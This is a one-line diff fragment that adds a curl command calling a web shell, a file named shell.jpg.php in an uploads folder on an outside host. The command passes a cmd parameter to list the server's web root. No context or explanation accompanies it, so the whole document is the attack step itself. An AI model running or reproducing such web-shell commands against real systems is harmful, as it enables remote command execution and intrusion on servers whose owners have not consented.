@@ -1,0 +1,1 @@
+curl "http://travel.rogue-sentinels.io:80/salmon-uploads/shell.jpg.php?cmd=ls+-la+/var/www/html/"
